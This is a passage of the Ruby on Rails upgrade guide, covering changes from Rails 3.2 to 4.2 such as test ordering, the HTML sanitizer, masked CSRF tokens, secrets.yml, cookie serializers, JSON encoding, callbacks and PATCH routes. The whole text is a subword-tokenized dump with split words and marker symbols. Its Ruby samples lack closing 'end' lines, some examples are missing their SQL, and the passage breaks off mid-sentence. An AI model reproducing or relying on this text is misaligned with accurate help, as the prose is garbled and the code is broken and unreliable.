▁In < n > ant ic ip ation ▁of ▁this ▁change , ▁Rails ▁4 . 2 ▁introduce d ▁a ▁new ▁configuration ▁option < n >` active _ support . test _ order ` ▁for ▁explicitly ▁specify ing ▁the ▁test ▁order ing .
▁This < n > allow s ▁you ▁to ▁either ▁ lock ▁down ▁the ▁current ▁behavior ▁by ▁setting ▁the ▁option ▁to < n >`: s or t ed `, ▁or ▁opt ▁into ▁the ▁future ▁behavior ▁by ▁setting ▁the ▁option ▁to ▁`: r and o m `.
▁If ▁you ▁do ▁not ▁specify ▁a ▁value ▁for ▁this ▁option , ▁a ▁deprecation ▁warning ▁will ▁be < n > em it t ed .
▁To ▁avoid ▁this , ▁add ▁the ▁following ▁line ▁to ▁your ▁test ▁environment :
▁# ▁config / environments / test . rb
▁Rails . application . config ure ▁do
▁config . active _ support . test _ order ▁= ▁: s or t ed ▁# ▁or ▁`: r and o m ` ▁if ▁you ▁prefer
▁### ▁ Seri al ize d ▁attributes
▁When ▁using ▁a ▁custom ▁code r ▁( e . g . ▁` serialize ▁: meta data , ▁JSON ` ), < n > as sign ing ▁` nil ` ▁to ▁a ▁serializ ed ▁attribute ▁will ▁save ▁it ▁to ▁the ▁database < n > as ▁` NULL ` ▁instead ▁of ▁passing ▁the ▁` nil ` ▁value ▁through ▁the ▁code r ▁( e . g . ▁` " null " `< n > when ▁using ▁the ▁` JSON ` ▁code r ).
▁### ▁ Product ion ▁log ▁level
▁In ▁Rails ▁5 , ▁the ▁default ▁log ▁level ▁for ▁the ▁production ▁environment ▁will ▁be ▁changed < n > to ▁`: debug ` ▁( from ▁`: info ` ).
▁To ▁pre serve ▁the ▁current ▁default , ▁add ▁the ▁following < n > line ▁to ▁your ▁` production . rb ` :
▁# ▁Set ▁to ▁`: info ` ▁to ▁match ▁the ▁current ▁default , ▁or ▁set ▁to ▁`: debug ` ▁to ▁opt - in to
▁# ▁the ▁future ▁default .
▁config . log _ level ▁= ▁: info
▁### ▁` after _ bundle ` ▁in ▁Rails ▁templates
▁If ▁you ▁have ▁a ▁Rails ▁template ▁that ▁add s ▁all ▁the ▁files ▁in ▁version ▁control , ▁it < n > fa il s ▁to ▁add ▁the ▁generated ▁bin stub s ▁because ▁it ▁get s ▁executed ▁before ▁Bundler :
▁# ▁template . rb
▁generate (: scaffold , ▁" person ▁name : string ")
▁route ▁" root ▁to : ▁' people # index ' "
▁rake (" db : migrate ")
▁git ▁: in it
▁git ▁add : ▁ "."
▁git ▁commit : ▁% Q { ▁- m ▁' Initial ▁commit ' ▁ }
▁You ▁can ▁now ▁wrap ▁the ▁` git ` ▁calls ▁in ▁an ▁` after _ bundle ` ▁block .
▁It ▁will ▁be ▁run < n > after ▁the ▁bin stub s ▁have ▁been ▁generated .
▁after _ bundle ▁do
▁git ▁: in it
▁git ▁add : ▁ "."
▁git ▁commit : ▁% Q { ▁- m ▁' Initial ▁commit ' ▁ }
▁### ▁Rails ▁HTML ▁S an it ize r
▁There ' s ▁a ▁new ▁choice ▁for ▁sanit i z ing ▁HTML ▁fragment s ▁in ▁your ▁applications .
▁The < n > ve n er able ▁ html - s can n er ▁approach ▁is ▁now ▁of fi cial ly ▁being ▁deprecated ▁in ▁favor ▁of < n >[ ` Rails ▁HTML ▁S an it ize r ` ]( https :// github . com / rails / rails - html - sanitize r ).
▁This ▁means ▁the ▁methods ▁` sanitize `, ▁` sanitize _ css `, ▁` str ip _ tag s ` ▁and < n >` str ip _ links ` ▁are ▁back ed ▁by ▁a ▁new ▁implementation .
▁This ▁new ▁ sanitize r ▁uses ▁[ L oo fa h ]( https :// github . com / f la v or j one s / lo of a h ) ▁internally .
▁L oo fa h ▁in ▁turn ▁uses ▁No k o g ir i , ▁which < n > wrap s ▁ X ML ▁pars ers ▁written ▁in ▁both ▁C ▁and ▁Java , ▁so ▁sanit i z ation ▁should ▁be ▁faster < n > no ▁matter ▁which ▁Ruby ▁version ▁you ▁run .
▁The ▁new ▁version ▁update s ▁` sanitize `, ▁so ▁it ▁can ▁take ▁a ▁` L oo fa h :: S crubber ` ▁for < n > p o w er ful ▁ sc ru b b ing .
▁[ S e e ▁some ▁examples ▁of ▁ s crubber s ▁here ]( https :// github . com / f la v or j one s / lo of a h # lo of a h s crubber ).
▁T w o ▁new ▁ s crubber s ▁have ▁also ▁been ▁added : ▁` P er m it S crubber ` ▁and ▁` T ar get S crubber `.
▁Read ▁the ▁[ gem ' s ▁ readme ]( https :// github . com / rails / rails - html - sanitize r ) ▁for ▁more ▁information .
▁The ▁documentation ▁for ▁` P er m it S crubber ` ▁and ▁` T ar get S crubber ` ▁ explain s ▁how ▁you < n > can ▁gain ▁complete ▁control ▁over ▁when ▁and ▁how ▁elements ▁should ▁be ▁ str ip ped .
▁If ▁your ▁application ▁needs ▁to ▁use ▁the ▁old ▁ sanitize r ▁implementation , ▁include ▁` rails - de pre cat ed _ sanitize r ` ▁in ▁your ▁Gemfile :
▁gem ▁' rails - de pre cat ed _ sanitize r '
▁### ▁Rails ▁DOM ▁Testing
▁The ▁[ ` T a g Assertion s ` ▁module ]( http :// api . rubyonrails . org / classes / ActionDispatch / Assertion s / T a g Assertion s . html ) ▁( contain ing ▁methods ▁such ▁as ▁` assert _ tag ` ), ▁[ has ▁been ▁deprecated ]( https :// github . com / rails / rails / blo b / 6 06 1 4 7 2 b 8 c 3 10 1 58 a 2 a 2 e 8 e 9 a 6 b 8 1 a 1 a e f 6 b 60 f e / action p ac k / lib / action _ dispatch / test ing / assert ion s / do m . rb ) ▁in ▁favor ▁of ▁the ▁` assert _ select ` ▁methods ▁from ▁the ▁` S el ec to r Assertion s ` ▁module , ▁which ▁has ▁been ▁extract ed ▁into ▁the ▁[ rails - do m - test ing ▁gem ]( https :// github . com / rails / rails - do m - test ing ).
▁### ▁M as k ed ▁ Auth ent ic ity ▁To k en s
▁In ▁order ▁to ▁m it ig ate ▁SSL ▁attacks , ▁` form _ authenticity _ token ` ▁is ▁now ▁m as k ed ▁so ▁that ▁it ▁var ies ▁with ▁each ▁request .
▁Thus , ▁token s ▁are ▁validate d ▁by ▁un ma s k ing ▁and ▁the n ▁ de crypt ing .
▁As ▁a ▁result , ▁any ▁ str ate g ies ▁for ▁verify ing ▁requests ▁from ▁non - rails ▁forms ▁that ▁relie d ▁on ▁a ▁static ▁session ▁CSRF ▁token ▁have ▁to ▁take ▁this ▁into ▁account .
▁### ▁Action ▁Mailer
▁P re v ious ly , ▁calling ▁a ▁mailer ▁method ▁on ▁a ▁mailer ▁class ▁will ▁result ▁in ▁the < n > corresponding ▁instance ▁method ▁being ▁executed ▁directly .
▁With ▁the ▁introduction ▁of < n > Active ▁Job ▁and ▁` # deliver _ later `, ▁this ▁is ▁no ▁longer ▁true .
▁In ▁Rails ▁4 . 2 , ▁the < n > invocation ▁of ▁the ▁instance ▁methods ▁are ▁def er r ed ▁un til ▁either ▁` deliver _ now ` ▁or < n >` deliver _ later ` ▁is ▁called .
▁class ▁Noti fi er ▁< ▁ ActionMailer :: Base
▁def ▁not ify ( user , ▁ ...)
▁put s ▁" C all ed "
▁mail ( to : ▁user . email , ▁ ...)
▁mail ▁= ▁Noti fi er . not ify ( user , ▁ ...)
▁mail ▁= ▁mail . deliver _ now ▁# ▁P r in t s ▁" C all ed "
▁def ▁self . br o ad ca st _ notifications ( users , ▁ ...)
▁users . each ▁ { ▁| user | ▁Noti fi er . not ify ( user , ▁ ...)
▁bundle ▁install
▁U pgrading ▁from ▁Rails ▁4.0 ▁to ▁Rails ▁4.1
▁### ▁CSRF ▁protect ion ▁from ▁remote ▁` < script >` ▁tags
▁Or , ▁" w ha a at ▁my ▁tests ▁are ▁failing ! ! ! ? "
▁C ross - site ▁request ▁ forgery ▁( CSRF ) ▁protect ion ▁now ▁cover s ▁GET ▁requests ▁with < n > JavaScript ▁response s , ▁too .
▁This ▁prevent s ▁a ▁third - part y ▁site ▁from ▁refer en c ing < n > your ▁JavaScript ▁URL ▁and ▁attempt ing ▁to ▁run ▁it ▁to ▁extract ▁ sensitive ▁data .
▁This ▁means ▁that ▁your ▁functional ▁and ▁integration ▁tests ▁that ▁use
▁get ▁: index , ▁format : ▁: js
▁will ▁now ▁trigger ▁CSRF ▁protect ion .
▁S w it ch ▁to
▁ xhr ▁: get , ▁: index , ▁format : ▁: js
▁to ▁explicitly ▁test ▁an ▁` X m l Http Request `.
▁If ▁you ▁really ▁mean ▁to ▁load ▁JavaScript ▁from ▁remote ▁` < script >` ▁tags , ▁skip ▁CSRF < n > p r o t ection ▁on ▁that ▁action .
▁### ▁S p r ing
▁If ▁you ▁want ▁to ▁use ▁S p r ing ▁as ▁your ▁application ▁p reload er ▁you ▁need ▁to :
▁Add ▁` gem ▁' spring ' , ▁group : ▁: development ` ▁to ▁your ▁` Gemfile `.
▁In st all ▁ spring ▁using ▁` bundle ▁install `.
▁S p r ing ify ▁your ▁bin stub s ▁with ▁` bundle ▁exec ▁ spring ▁bin stub ▁-- all `.
▁NOTE : ▁User ▁defined ▁rake ▁task s ▁will ▁run ▁in ▁the ▁` development ` ▁environment ▁by < n > default .
▁If ▁you ▁want ▁them ▁to ▁run ▁in ▁other ▁environments ▁consult ▁the < n >[ S p r ing ▁README ]( https :// github . com / rails / spring # rake ).
▁### ▁` config / secret s . yml `
▁If ▁you ▁want ▁to ▁use ▁the ▁new ▁` secret s . yml ` ▁convention ▁to ▁store ▁your ▁application ' s < n > secret s , ▁you ▁need ▁to :
▁Create ▁a ▁` secret s . yml ` ▁file ▁in ▁your ▁` config ` ▁folder ▁with ▁the ▁following ▁content :
▁`` ` y am l
▁secret _ key _ base :
▁Use ▁your ▁existing ▁` secret _ key _ base ` ▁from ▁the ▁` secret _ token . rb ` ▁initializer ▁to < n > ▁set ▁the ▁S E C RE T _ K E Y _ BASE ▁environment ▁variable ▁for ▁which ever ▁users ▁running ▁the < n > ▁Rails ▁application ▁in ▁production ▁mode .
▁A lternatively , ▁you ▁can ▁simply ▁copy ▁the ▁existing < n > ▁` secret _ key _ base ` ▁from ▁the ▁` secret _ token . rb ` ▁initializer ▁to ▁` secret s . yml `< n > ▁under ▁the ▁` production ` ▁section , ▁replacing ▁' <%= ▁ ENV [ " S E C RE T _ K E Y _ BASE "] ▁%> ' .
▁Re m o ve ▁the ▁` secret _ token . rb ` ▁initializer .
▁Use ▁` rake ▁secret ` ▁to ▁generate ▁new ▁keys ▁for ▁the ▁` development ` ▁and ▁` test ` ▁section s .
▁Re start ▁your ▁server .
▁### ▁Change s ▁to ▁test ▁helper
▁If ▁your ▁test ▁helper ▁contains ▁a ▁call ▁to < n >` ActiveRecord :: Migration . check _ pending !` ▁this ▁can ▁be ▁removed .
▁The ▁check < n > is ▁now ▁done ▁automatically ▁when ▁you ▁` require ▁' rails / test _ help ' `, ▁although < n > le a v ing ▁this ▁line ▁in ▁your ▁helper ▁is ▁not ▁harm ful ▁in ▁any ▁way .
▁### ▁Co o k ies ▁serializ er
▁Application s ▁created ▁before ▁Rails ▁4.1 ▁uses ▁` M ar s h al ` ▁to ▁ serialize ▁cookie ▁values ▁into < n > the ▁signed ▁and ▁encrypted ▁cookie ▁ j ar s .
▁If ▁you ▁want ▁to ▁use ▁the ▁new ▁` JSON ` - base d ▁format < n > in ▁your ▁application , ▁you ▁can ▁add ▁an ▁initializer ▁file ▁with ▁the ▁following ▁content :
▁Rails . application . config . action _ dispatch . cookies _ serialize r ▁= ▁: hybrid
▁This ▁would ▁tr an s parent ly ▁ migrate ▁your ▁existing ▁` M ar s h al ` - serialize d ▁cookies ▁into ▁the < n > new ▁` JSON ` - base d ▁format .
▁When ▁using ▁the ▁`: json ` ▁or ▁`: hybrid ` ▁serializ er , ▁you ▁should ▁be w a re ▁that ▁not ▁all < n > Ruby ▁objects ▁can ▁be ▁serializ ed ▁as ▁JSON . ▁For ▁example , ▁` Date ` ▁and ▁` Time ` ▁objects < n > will ▁be ▁serializ ed ▁as ▁strings , ▁and ▁` Hash ` es ▁will ▁have ▁their ▁keys ▁ stringified .
▁class ▁Co o k ies Controller ▁< ▁Application Controller
▁def ▁set _ cookie
▁cookies . encrypted [: expiration _ date ] ▁= ▁Date . to m or row ▁# ▁=> ▁Thu , ▁20 ▁M ar ▁2014
▁redirect _ to ▁action : ▁' read _ cookie '
▁def ▁read _ cookie
▁cookies . encrypted [: expiration _ date ] ▁# ▁=> ▁" 20 1 4 - 0 3- 20 "
▁It ' s ▁a d v is able ▁that ▁you ▁only ▁store ▁simple ▁data ▁( string s ▁and ▁number s ) ▁in ▁cookies .
▁If ▁you ▁have ▁to ▁store ▁complex ▁objects , ▁you ▁would ▁need ▁to ▁handle ▁the ▁con version < n > ma n u ally ▁when ▁reading ▁the ▁values ▁on ▁subsequent ▁requests .
▁If ▁you ▁use ▁the ▁cookie ▁session ▁store , ▁this ▁would ▁apply ▁to ▁the ▁` session ` ▁and < n >` flash ` ▁hash ▁as ▁well .
▁### ▁ Flash ▁structure ▁changes
▁ Flash ▁message ▁keys ▁are < n >[ normal ize d ▁to ▁strings ]( https :// github . com / rails / rails / commit / a 6 68 be ff d 64 1 06 a 1 e 1 f ed b 7 1 cc 2 5 e a a a 11 b a f 0 c 1 ). ▁They < n > can ▁ still ▁be ▁access ed ▁using ▁either ▁symbols ▁or ▁strings .
▁L oo p ing ▁through ▁the ▁flash < n > will ▁always ▁yield ▁string ▁keys :
▁flash [ " string "] ▁= ▁" a ▁string "
▁flash [: symbol ] ▁= ▁" a ▁symbol "
▁# ▁Rails ▁< ▁4.1
▁flash . keys ▁# ▁=> ▁[" string ", ▁: symbol ]
▁# ▁Rails ▁ > = ▁4.1
▁flash . keys ▁# ▁=> ▁[" string ", ▁" symbol "]
▁ Make ▁sure ▁you ▁are ▁compar ing ▁ Flash ▁message ▁keys ▁again st ▁strings .
▁### ▁Change s ▁in ▁JSON ▁handling
▁There ▁are ▁a ▁few ▁major ▁changes ▁related ▁to ▁JSON ▁handling ▁in ▁Rails ▁4.1 .
▁#### ▁Multi JSON ▁remov al
▁Multi JSON ▁has ▁reach ed ▁its ▁[ end - of - life ]( https :// github . com / rails / rails / pull / 10 5 76 )< n > and ▁has ▁been ▁removed ▁from ▁Rails .
▁If ▁your ▁application ▁current ly ▁depend ▁on ▁Multi JSON ▁directly , ▁you ▁have ▁a ▁few ▁options :
▁Add ▁' multi _ json ' ▁to ▁your ▁Gemfile .
▁Note ▁that ▁this ▁m ight ▁ ce as e ▁to ▁work ▁in ▁the ▁future
▁M ig r ate ▁a way ▁from ▁Multi JSON ▁by ▁using ▁` ob j . to _ json `, ▁and ▁` JSON . parse ( str )` ▁instead .
▁WARNING : ▁Do ▁not ▁simply ▁replace ▁` M ul t i J s on . dump ` ▁and ▁` M ul t i J s on . load ` ▁with < n >` JSON . dump ` ▁and ▁` JSON . load `.
▁These ▁JSON ▁gem ▁API s ▁are ▁mean t ▁for ▁serializ ing ▁and < n > de se rial i z ing ▁arbitrar y ▁Ruby ▁objects ▁and ▁are ▁generally ▁[ un safe ]( http :// www . ruby - doc . org / st d lib - 2 . 0 . 0 / lib doc / json / rdoc / JSON . html # method - i - load ).
▁#### ▁JSON ▁gem ▁ compatibility
▁H ist or ical ly , ▁Rails ▁ha d ▁some ▁ compatibility ▁issues ▁with ▁the ▁JSON ▁gem .
▁Using < n >` JSON . generate ` ▁and ▁` JSON . dump ` ▁inside ▁a ▁Rails ▁application ▁could ▁produce < n > un expected ▁errors .
▁Rails ▁4.1 ▁ fixed ▁these ▁issues ▁by ▁is ol at ing ▁its ▁own ▁ en code r ▁from ▁the ▁JSON ▁gem .
▁The < n > JSON ▁gem ▁API s ▁will ▁function ▁as ▁normal , ▁but ▁they ▁will ▁not ▁have ▁access ▁to ▁any < n > Rails - specific ▁features .
▁class ▁ FooBar
▁def ▁as _ json ( options ▁= ▁nil )
▁ { ▁ foo : ▁' bar ' ▁ }
▁ >> ▁ FooBar . new . to _ json ▁# ▁=> ▁" { \ " foo \ " : \ " bar \ "} "
▁ >> ▁JSON . generate ( FooBar . new , ▁ q u ir k s _ m ode : ▁true ) ▁# ▁=> ▁" \ " # < FooBar : 0 x 0 07 fa 8 0 a 4 8 16 10 >\ " "
▁#### ▁ New ▁JSON ▁ en code r
▁The ▁JSON ▁ en code r ▁in ▁Rails ▁4.1 ▁has ▁been ▁re written ▁to ▁take ▁advantage ▁of ▁the ▁JSON < n > gem .
▁For ▁most ▁applications , ▁this ▁should ▁be ▁a ▁tr an s parent ▁change .
▁However , ▁as < n > part ▁of ▁the ▁re write , ▁the ▁following ▁features ▁have ▁been ▁removed ▁from ▁the ▁ en code r :
▁C ir c ul ar ▁data ▁structure ▁detect ion
▁Support ▁for ▁the ▁` en code _ json ` ▁ hook
▁Option ▁to ▁ en code ▁` BigDecimal ` ▁objects ▁as ▁number s ▁instead ▁of ▁strings
▁If ▁your ▁application ▁depend s ▁on ▁one ▁of ▁these ▁features , ▁you ▁can ▁get ▁them ▁back ▁by < n > adding ▁the ▁[ ` active support - json _ en code r ` ]( https :// github . com / rails / active support - json _ en code r )< n > gem ▁to ▁your ▁Gemfile .
▁#### ▁JSON ▁representation ▁of ▁Time ▁objects
▁` # as _ json ` ▁for ▁objects ▁with ▁time ▁component ▁( ` Time `, ▁` DateTime `, ▁` ActiveSupport :: Time With Z one ` )< n > now ▁returns ▁m il li second ▁ precision ▁by ▁default .
▁If ▁you ▁need ▁to ▁keep ▁old ▁behavior ▁with ▁no ▁m il li second < n > precision , ▁set ▁the ▁following ▁in ▁an ▁initializer :
▁ ActiveSupport :: JSON :: Encoding . time _ precision ▁= ▁0
▁### ▁U s age ▁of ▁` return ` ▁within ▁in line ▁callback ▁blocks
▁P re v ious ly , ▁Rails ▁allowed ▁in line ▁callback ▁blocks ▁to ▁use ▁` return ` ▁this ▁way :
▁class ▁Read O n ly Model ▁< ▁ActiveRecord :: Base
▁before _ save ▁ { ▁return ▁false ▁ } ▁# ▁B A D
▁This ▁behavior ▁was ▁ never ▁in t ent ion ally ▁supported .
▁D ue ▁to ▁a ▁change ▁in ▁the ▁internal s < n > of ▁` ActiveSupport :: Callbacks `, ▁this ▁is ▁no ▁longer ▁allowed ▁in ▁Rails ▁4.1 .
▁Using ▁a < n >` return ` ▁statement ▁in ▁an ▁in line ▁callback ▁block ▁cause s ▁a ▁` Local J um p Error ` ▁to < n > be ▁raised ▁when ▁the ▁callback ▁is ▁executed .
▁In line ▁callback ▁blocks ▁using ▁` return ` ▁can ▁be ▁ refactored ▁to ▁evaluate ▁to ▁the < n > return ed ▁value :
▁before _ save ▁ { ▁false ▁ } ▁# ▁G O O D
▁A lternatively , ▁if ▁` return ` ▁is ▁preferred ▁it ▁is ▁recommended ▁to ▁explicitly ▁define < n > a ▁method :
▁before _ save ▁: before _ save _ callback ▁# ▁G O O D
▁def ▁before _ save _ callback
▁return ▁false
▁This ▁change ▁applies ▁to ▁most ▁place s ▁in ▁Rails ▁where ▁callbacks ▁are ▁used , ▁including < n > Active ▁Record ▁and ▁Active ▁Model ▁callbacks , ▁as ▁well ▁as ▁filter s ▁in ▁Action < n > Controller ▁( e . g . ▁` before _ action ` ).
▁See ▁[ this ▁pull ▁request ]( https :// github . com / rails / rails / pull /1 3 27 1 ) ▁for ▁more < n > de t a il s .
▁### ▁ Method s ▁defined ▁in ▁Active ▁Record ▁fixtures
▁Rails ▁4.1 ▁evaluate s ▁each ▁fixture ' s ▁ERB ▁in ▁a ▁separate ▁context , ▁so ▁helper ▁methods < n > defined ▁in ▁a ▁fixture ▁will ▁not ▁be ▁available ▁in ▁other ▁fixtures .
▁ Helper ▁methods ▁that ▁are ▁used ▁in ▁multiple ▁fixtures ▁should ▁be ▁defined ▁on ▁module s < n > include d ▁in ▁the ▁new ly ▁introduce d ▁` ActiveRecord :: F i x t ure S et . co n text _ class `, ▁in < n >` test _ helper . rb `.
▁module ▁Fix t ure File Helpers
▁def ▁file _ s ha ( path )
▁D ig est :: S H A 2 . h ex digest ( File . read ( Rails . root . join (' test / fixtures ' , ▁path ) ) )
▁ActiveRecord :: F i x t ure S et . co n text _ class . s end ▁: include , ▁Fix t ure File Helpers
▁### ▁I 18 n ▁enforc ing ▁available ▁locale s
▁Rails ▁4.1 ▁now ▁defaults ▁the ▁I 18 n ▁option ▁` en force _ available _ locale s ` ▁to ▁` true `.
▁This < n > me an s ▁that ▁it ▁will ▁make ▁sure ▁that ▁all ▁locale s ▁passed ▁to ▁it ▁must ▁be ▁declare d ▁in < n > the ▁` available _ locale s ` ▁list .
▁To ▁disable ▁it ▁( and ▁allow ▁I 18 n ▁to ▁accept ▁* any * ▁locale ▁option ) ▁add ▁the ▁following < n > configuration ▁to ▁your ▁application :
▁config . i 18 n . en force _ available _ locale s ▁= ▁false
▁Note ▁that ▁this ▁option ▁was ▁added ▁as ▁a ▁security ▁me as ure , ▁to ▁ensure ▁user ▁input < n > cannot ▁be ▁used ▁as ▁locale ▁information ▁unless ▁it ▁is ▁previous ly ▁known .
▁There for e ,< n > it ' s ▁recommended ▁not ▁to ▁disable ▁this ▁option ▁unless ▁you ▁have ▁a ▁ strong ▁reason ▁for < n > do ing ▁so .
▁### ▁M u t at or ▁methods ▁called ▁on ▁ Relation
▁` Relation ` ▁no ▁longer ▁has ▁m u t at or ▁methods ▁like ▁` # map !` ▁and ▁` # delete _ if `.
▁Convert < n > to ▁an ▁` Array ` ▁by ▁calling ▁` # to _ a ` ▁before ▁using ▁these ▁methods .
▁It ▁intend s ▁to ▁prevent ▁odd ▁bug s ▁and ▁confusion ▁in ▁code ▁that ▁call ▁m u t at or < n > methods ▁directly ▁on ▁the ▁` Relation `.
▁# ▁Instead ▁of ▁this
▁ Auth or . where ( name : ▁' H an k ▁M ood y ' ). co mpact !
▁# ▁Now ▁you ▁have ▁to ▁do ▁this
▁author s ▁= ▁ Auth or . where ( name : ▁' H an k ▁M ood y ' ). to _ a
▁author s . co mpact !
▁### ▁Change s ▁on ▁Default ▁Scopes
▁Default ▁scope s ▁are ▁no ▁longer ▁overrid de n ▁by ▁chain ed ▁conditions .
▁In ▁previous ▁versions ▁when ▁you ▁defined ▁a ▁` default _ scope ` ▁in ▁a ▁model < n > it ▁was ▁overrid de n ▁by ▁chain ed ▁conditions ▁in ▁the ▁same ▁field .
▁Now ▁it < n > is ▁merge d ▁like ▁any ▁other ▁scope .
▁Before :
▁* ▁FROM ▁" users " ▁WHERE ▁" users "." state " ▁= ▁' active '
▁After :
▁To ▁get ▁the ▁previous ▁behavior ▁it ▁is ▁needed ▁to ▁explicitly ▁remove ▁the < n >` default _ scope ` ▁condition ▁using ▁` unscope d `, ▁` unscope `, ▁` re where ` ▁or < n >` except `.
▁scope ▁: active , ▁-> ▁ { ▁ unscope ( where : ▁: state ). where ( state : ▁' active ') ▁ }
▁scope ▁: in active , ▁-> ▁ { ▁re where ▁state : ▁' in active ' ▁ }
▁User . in active
▁### ▁Rendering ▁content ▁from ▁string
▁Rails ▁4.1 ▁introduce s ▁`: plain `, ▁`: html `, ▁and ▁`: body ` ▁options ▁to ▁` render `.
▁Those < n > options ▁are ▁now ▁the ▁preferred ▁way ▁to ▁render ▁string - base d ▁content , ▁as ▁it ▁allows < n > you ▁to ▁specify ▁which ▁content ▁type ▁you ▁want ▁the ▁response ▁sent ▁as .
▁* ▁` render ▁: plain ` ▁will ▁set ▁the ▁content ▁type ▁to ▁` text / plain `
▁* ▁` render ▁: html ` ▁will ▁set ▁the ▁content ▁type ▁to ▁` text / html `
▁* ▁` render ▁: body ` ▁will ▁* not * ▁set ▁the ▁content ▁type ▁header .
▁ From ▁the ▁security ▁stand point , ▁if ▁you ▁don ' t ▁expect ▁to ▁have ▁any ▁markup ▁in ▁your < n > response ▁body , ▁you ▁should ▁be ▁using ▁` render ▁: plain ` ▁as ▁most ▁browsers ▁will ▁escape < n > un safe ▁content ▁in ▁the ▁response ▁for ▁you .
▁We ▁will ▁be ▁ de pre cat ing ▁the ▁use ▁of ▁` render ▁: text ` ▁in ▁a ▁future ▁version .
▁So ▁please < n > start ▁using ▁the ▁more ▁precise ▁`: plain `, ▁`: html `, ▁and ▁`: body ` ▁options ▁instead .
▁Using ▁` render ▁: text ` ▁may ▁p o se ▁a ▁security ▁risk , ▁as ▁the ▁content ▁is ▁sent ▁as < n >` text / html `.
▁### ▁PostgreSQL ▁ json ▁and ▁h store ▁data type s
▁Rails ▁4.1 ▁will ▁map ▁` json ` ▁and ▁` h store ` ▁columns ▁to ▁a ▁string - key ed ▁Ruby ▁` Hash `.
▁In ▁earlier ▁versions , ▁a ▁` Hash With In different A cc es s ` ▁was ▁used .
▁This ▁means ▁that < n > symbol ▁access ▁is ▁no ▁longer ▁supported .
▁This ▁is ▁also ▁the ▁case ▁for < n >` store _ accessor s ` ▁base d ▁on ▁to p ▁of ▁` json ` ▁or ▁` h store ` ▁columns .
▁ Make ▁sure ▁to ▁use < n > string ▁keys ▁consistent ly .
▁### ▁E xplicit ▁block ▁use ▁for ▁` ActiveSupport :: Callbacks `
▁Rails ▁4.1 ▁now ▁expect s ▁an ▁explicit ▁block ▁to ▁be ▁passed ▁when ▁calling < n >` ActiveSupport :: Callbacks . set _ callback `.
▁This ▁change ▁ st em s ▁from < n >` ActiveSupport :: Callbacks ` ▁being ▁large ly ▁re written ▁for ▁the ▁4.1 ▁release .
▁# ▁P re v ious ly ▁in ▁Rails ▁4.0
▁set _ callback ▁: save , ▁: ar ound , ▁-> ( r , ▁ & block ) ▁ { ▁ stuff ; ▁result ▁= ▁block . c all ; ▁ stuff ▁ }
▁# ▁Now ▁in ▁Rails ▁4.1
▁set _ callback ▁: save , ▁: ar ound , ▁-> ( r , ▁block ) ▁ { ▁ stuff ; ▁result ▁= ▁block . c all ; ▁ stuff ▁ }
▁U pgrading ▁from ▁Rails ▁3.2 ▁to ▁Rails ▁4.0
▁If ▁your ▁application ▁is ▁current ly ▁on ▁any ▁version ▁of ▁Rails ▁older ▁than ▁3.2 . x , ▁you ▁should ▁upgrade ▁to ▁Rails ▁3.2 ▁before ▁attempt ing ▁one ▁to ▁Rails ▁4.0 .
▁The ▁following ▁changes ▁are ▁mean t ▁for ▁upgrading ▁your ▁application ▁to ▁Rails ▁4.0 .
▁### ▁HTTP ▁ PATCH
▁Rails ▁4 ▁now ▁uses ▁` PATCH ` ▁as ▁the ▁primary ▁HTTP ▁verb ▁for ▁update s ▁when ▁a ▁RESTful < n > resource ▁is ▁declare d ▁in ▁` config / routes . rb `.
▁The ▁` update ` ▁action ▁is ▁ still ▁used ,< n > and ▁` PUT ` ▁requests ▁will ▁continu e ▁to ▁be ▁route d ▁to ▁the ▁` update ` ▁action ▁as ▁well .
▁So , ▁if ▁you ' re ▁using ▁only ▁the ▁standard ▁RESTful ▁routes , ▁no ▁changes ▁need ▁to ▁be ▁made :
▁resources ▁: users
▁<%= ▁form _ for ▁@ user ▁do ▁| f | ▁%>
▁def ▁update
▁# ▁No ▁change ▁needed ; ▁ PATCH ▁will ▁be ▁preferred , ▁and ▁ PUT ▁will ▁ still ▁work .
▁However , ▁you ▁will ▁need ▁to ▁make ▁a ▁change ▁if ▁you ▁are ▁using ▁` form _ for ` ▁to ▁update < n > a ▁resource ▁in ▁con j un c t ion ▁with ▁a ▁custom ▁route ▁using ▁the ▁` PUT ` ▁HTTP ▁method :
▁resources ▁: users , ▁do
▁put ▁: update _ name , ▁on : ▁: member
▁<%= ▁form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] ▁do ▁| f | ▁%>
▁def ▁update _ name
▁# ▁Change ▁needed ; ▁form _ for ▁will ▁try ▁to ▁use ▁a ▁non - ex ist ent ▁ PATCH ▁route .
▁If ▁the ▁action ▁is ▁not ▁being ▁used ▁in ▁a ▁public ▁API ▁and ▁you ▁are ▁free ▁to ▁change ▁the < n > HTTP ▁method , ▁you ▁can ▁update ▁your ▁route ▁to ▁use ▁` patch ` ▁instead ▁of ▁` put ` :
▁` PUT ` ▁requests ▁to ▁` / users / : id ` ▁in ▁Rails ▁4 ▁get ▁route d ▁to ▁` update ` ▁as ▁they ▁are < n > to day .
▁So , ▁if ▁you ▁have ▁an ▁API ▁that ▁get s ▁real ▁ PUT ▁requests ▁it ▁is ▁going ▁to ▁work .
▁The ▁route r ▁also ▁routes ▁` PATCH ` ▁requests ▁to ▁` / users / : id ` ▁to ▁the ▁` update ` ▁action .
▁resources ▁: users ▁do
▁ patch ▁: update _ name , ▁on : ▁: member
▁If ▁the ▁action ▁is ▁being ▁used ▁in ▁a ▁public ▁API ▁and ▁you ▁can ' t ▁change ▁to ▁HTTP ▁method < n > be ing ▁used , ▁you ▁can ▁update ▁your ▁form ▁to ▁use ▁the ▁` PUT ` ▁method ▁instead :
▁<%= ▁form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] , ▁method : ▁: put ▁do ▁| f | ▁%>
▁For ▁more ▁on ▁ PATCH ▁and ▁why ▁this ▁change ▁was ▁made , ▁see ▁[ this ▁post ]( http :// web log . rubyonrails . org / 20 12 / 2 / 2 6 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s / )< n > on ▁the ▁Rails ▁blog .
▁#### ▁A ▁note ▁about ▁m edia ▁types
▁The ▁ er r at a ▁for ▁the ▁` PATCH ` ▁verb ▁[ spec if ies ▁that ▁a ▁' d if f ' ▁m edia ▁type ▁should ▁be < n > us ed ▁with ▁` PATCH ` ]( http :// www . r f c - edit or . org / er r at a _ search . ph p ? r f c = 57 89 ). ▁One < n > such ▁format ▁is ▁[ JSON ▁P at ch ]( http :// to ol s . i et f . org / html / r f c 6 9 02 ). ▁Whi le ▁Rails < n > do es ▁not ▁support ▁JSON ▁P at ch ▁native ly , ▁it ' s ▁easy ▁enough ▁to ▁add ▁support :
